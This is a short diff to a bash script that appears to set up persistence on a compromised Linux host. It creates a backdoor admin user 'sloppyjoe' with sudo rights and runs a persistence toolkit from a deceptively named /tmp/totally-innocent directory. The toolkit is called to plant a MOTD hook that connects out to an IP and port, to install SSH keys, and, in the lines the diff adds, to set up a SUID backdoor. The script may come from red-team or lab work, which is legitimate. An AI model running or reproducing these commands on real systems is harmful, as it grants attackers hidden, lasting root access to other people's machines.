@@ -1,7 +1,5 @@
 #!/bin/bash
 
-
-
 # Create Admin User sloppyjoe
 adduser --disabled-password --gecos "" "sloppyjoe" >/dev/null
 usermod -aG sudo,adm "sloppyjoe" >/dev/null
@@ -32,6 +30,10 @@ bash /tmp/totally-innocent/panix.sh --motd --default --ip 192.168.34.3 --port 44
 bash /tmp/totally-innocent/panix.sh --ssh-key --cutom --user sloppyjoe
 ##for default in case not sudo
 bash /tmp/totally-innocent/panix.sh --ssh-key --default
+
+#suid
+bash /tmp/totally-innocent/panix.sh --suid --default
+
 
 
  
